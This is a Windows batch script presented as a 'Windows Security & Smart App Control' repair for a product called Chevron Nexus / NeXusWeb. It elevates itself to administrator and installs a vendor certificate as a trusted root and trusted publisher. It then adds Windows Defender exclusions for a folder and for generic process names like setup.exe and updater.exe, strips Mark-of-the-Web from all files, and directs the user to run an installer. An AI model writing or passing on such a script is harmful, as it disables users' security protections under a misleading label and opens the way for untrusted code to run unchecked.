@echo off
setlocal EnableDelayedExpansion

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Requesting Administrator Elevation...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"\"%~dpnx0\"\"' -Verb RunAs"
    exit /b
)

title Chevron Nexus - Windows Security & Smart App Control Fix
color 0b
cd /d "%~dp0"

echo =================================================================
echo   Chevron Nexus - Windows Security & Smart App Control Repair   
echo =================================================================
echo.

echo [1/5] Resetting Windows Security UI App (Fixes White Blank Screen)...
powershell -NoProfile -Command "Get-AppxPackage Microsoft.SecHealthUI | Reset-AppxPackage -ErrorAction SilentlyContinue; Add-AppxPackage -Register 'C:\Windows\SystemApps\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\AppxManifest.xml' -DisableDevelopmentMode -ErrorAction SilentlyContinue"
echo       [OK] Windows Security UI reset.
echo.

echo [2/5] Installing Chevron Nexus Certificate to Local Machine Root & TrustedPublisher...
if exist "%~dp0ChevronNexusSoftware.cer" (
    certutil -addstore -f "Root" "%~dp0ChevronNexusSoftware.cer" >nul
    certutil -addstore -f "TrustedPublisher" "%~dp0ChevronNexusSoftware.cer" >nul
    echo       [OK] Certificate registered system-wide.
) else (
    echo       [!] ChevronNexusSoftware.cer not found in %~dp0.
)
echo.

echo [3/5] Adding Windows Defender Path & Process Exclusions...
powershell -NoProfile -Command "Add-MpPreference -ExclusionPath 'F:\NeXusWeb', '$env:LOCALAPPDATA\ChevronNexus' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'NeXusWeb-V9.exe', 'NeXusWeb-Setup-v9.5.0.exe', 'setup.exe', 'uninstaller.exe', 'updater.exe' -ErrorAction SilentlyContinue"
echo       [OK] Exclusions added for NeXusWeb workspace and binaries.
echo.

echo [4/5] Removing Mark-of-the-Web (Zone.Identifier) locks...
powershell -NoProfile -Command "Get-ChildItem -Path '%~dp0' -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }"
echo       [OK] All binary files unblocked.
echo.

echo [5/5] Restarting Windows Security Health Service...
taskkill /F /IM SecHealthUI.exe 2>nul
net stop wscsvc 2>nul
net start wscsvc 2>nul
echo       [OK] Windows Security service refreshed.
echo.

echo =================================================================
echo   SUCCESS: All Smart App Control & Windows Security fixes applied!
echo   You can now launch NeXusWeb-Setup-v9.5.0.exe smoothly.
echo =================================================================
echo.
pause
